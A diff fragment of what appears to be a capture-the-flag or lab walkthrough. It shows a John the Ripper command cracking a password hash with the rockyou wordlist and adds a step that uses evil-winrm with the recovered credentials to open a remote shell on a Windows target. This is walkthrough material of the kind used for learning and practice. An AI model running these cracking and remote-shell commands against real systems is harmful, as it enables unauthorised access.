@@ -74,8 +74,13 @@ Then we could use john to crack the hash.
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  
 ```
 
+**Using ```evil-winrm``` to get a shell**
 
-
+Using the credentials we have, we can use ```evil-winrm``` to get a shell.
+	
+```
+$ evil-winrm -i <domain name> -u '<user we got>' -p 'his password'
+```
 
 
 
